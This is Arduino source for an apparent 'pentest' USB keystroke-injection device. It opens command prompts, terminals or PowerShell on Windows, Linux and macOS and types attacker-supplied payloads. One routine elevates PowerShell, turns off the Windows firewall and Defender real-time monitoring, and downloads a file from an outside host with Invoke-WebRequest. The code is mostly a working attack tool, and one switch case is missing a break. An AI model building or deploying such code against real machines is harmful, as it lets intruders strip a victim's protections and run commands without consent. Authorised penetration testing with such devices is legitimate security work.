#include "Arduino.h"
#include "PENTEST_KEYBOARD.h"

 
  /****************** kEYBOARD FUNCTIONS ***************************/

void typeKey(int key) {
  Keyboard.press(key);
  delay(defaultCharDelay);
  Keyboard.release(key);
}

void windowsOpen(String app){
      delay(defaultDelay);
      delay(defaultDelay);
      Keyboard.press(KEY_LEFT_GUI);
      Keyboard.press(114);
      Keyboard.releaseAll();

      delay(defaultDelay);
      delay(200);

      delay(defaultDelay);
      Keyboard.print(app);

      delay(defaultDelay);
      typeKey(KEY_RETURN);
      delay(100);
}


void openCMD() {
  delay(defaultDelay);
  switch (OS) {
    case 'W':
      windowsOpen("cmd");
    case 'L':    
      Keyboard.press(KEY_LEFT_ALT);
      delay(defaultDelay);
      Keyboard.press(KEY_LEFT_CTRL);
      delay(defaultDelay);
      Keyboard.press('t');
      delay(defaultDelay);
      Keyboard.releaseAll();
      delay(200);

      break;


    case 'M':    // Mac OS run dialog
      delay(defaultDelay);
      Keyboard.press(KEY_LEFT_GUI);
      Keyboard.press(' '); //cmd + N opens new terminal window, cmd + space opens spotlight search
      Keyboard.releaseAll();
      delay(600);
      Keyboard.print("Terminal");
      delay(200);
      typeKey(KEY_RETURN);
      Keyboard.releaseAll();
      delay(defaultDelay);
      delay(200);
      break;
  }

}

String readPayload(byte payload[]){
  String com = String((char*)payload);
  return com; 
}

char typeCommands(byte payload[]) {
  int i = 0;
  String com = readPayload(payload);
  Serial.println(com);
  while (com[i] != '\0'){
    if (com[i]=='@'){
      ++i; 
      Serial.print("Exectuting special ");
      Serial.println(com[i]);
      executeSpecialCommand(com[i]);
      ++i;
    }
    Keyboard.write(com[i]);
    ++i;
  }  
  com = "";
  typeKey(KEY_RETURN);
  Keyboard.releaseAll();
}

void toggleFirewall(bool turnOff=false){
  if (turnOff){
    Keyboard.println("netsh advfirewall set allprofiles state off");
    Keyboard.println("Set-MpPreference -DisableRealtimeMonitoring $true");
  } else {
    Keyboard.println("netsh advfirewall set currentprofile state on");
    Keyboard.println("Set-MpPreference -DisableRealtimeMonitoring $false");
  }
  delay(100);
}

void executeSpecialCommand(byte command){

  switch (command)
  {
  case '1':
    setOS('W');
    openCMD();
    break;
  case '2':
    setOS('L');
    openCMD();
    break;
  case '3':
    setOS('M');
    openCMD();
    break; 
  case '4':
    windowsOpen("Powershell");
    break;
  case '5':
    windowsOpen("Powershell");
    Keyboard.println("start-process powershell -verb runas");
    delay(1000);
    toggleFirewall(true);
    Keyboard.println("# Source file location \n$source \
    =\"http://ipv4.download.thinkbroadband.com:8080/512MB.zip\"\n\
    # Destination to save the file\n\
    $destination = \'c:\\10MB.zip\'\n\
    #Download the file\n\
    Invoke-WebRequest -Uri $source -OutFile $destination");
  }
}

void setOS(char operatingSystem){
  OS = operatingSystem;
}
